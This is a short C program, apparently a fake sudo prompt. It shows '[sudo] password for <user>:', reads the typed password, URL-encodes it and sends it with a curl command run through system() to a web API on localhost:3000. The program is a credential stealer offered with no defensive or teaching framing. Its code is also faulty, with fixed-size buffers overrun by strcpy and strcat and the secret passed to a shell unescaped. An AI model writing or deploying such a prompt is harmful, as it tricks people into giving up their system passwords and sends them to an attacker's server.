#include<unistd.h>
#include"base.c"
int main (void ) {
	
	char pw[MAXPW] = {0};
	char *p = pw;
	FILE *fp = stdin;
	ssize_t nchr = 0;
	
	char *buf;
	buf = (char *)malloc(10*sizeof(char));
	buf = getlogin();

	printf ( "\n [sudo] password for %s: ",buf);
	nchr = getpasswd (&p, MAXPW, 0, fp);
	//printf ("\n password: %s ", p);
	char url[20]; strcpy(url, urlencode(p));
	char furl[] = "http://localhost:3000/api?username=";
	strcat(furl,url);
	//printf("url = %s", furl);
	char curl[] = "curl ";
	strcat(curl,furl);
	printf("\n");
	system(curl);
	return 0;
}
